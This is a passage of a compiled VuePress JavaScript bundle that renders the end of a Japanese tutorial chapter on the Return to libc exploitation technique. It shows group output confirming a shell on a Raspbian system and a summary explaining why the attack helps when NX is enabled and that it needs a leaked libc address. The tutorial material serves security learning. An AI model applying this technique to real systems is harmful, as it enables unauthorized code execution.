punctuation"}},[t._v(")")]),t._v(",60"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("games"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",100"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("users"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",105"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("input"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",109"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("netdev"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",997"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gpio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",998"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i2c"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",999"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("spi"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("p",[t._v("Raspbian のシェルが操作できていることが確認できました。")]),t._v(" "),a("h2",{attrs:{id:"_3-3-まとめ"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-3-まとめ","aria-hidden":"true"}},[t._v("#")]),t._v(" 3.3 まとめ")]),t._v(" "),a("p",[t._v("本章では、Return to libc という攻撃テクニックについて学びました。本攻撃手法は、NX が有効な場合などシェルコードを簡単に実行できない状況ではとても便利な攻撃手法です。一方で利用するためには、libcアドレスをリークしておく必要があるため他の脆弱性と併用しなければなりませんが、とても強力な攻撃です。")])])}),[],!1,null,null,null);s.default=e.exports}}]);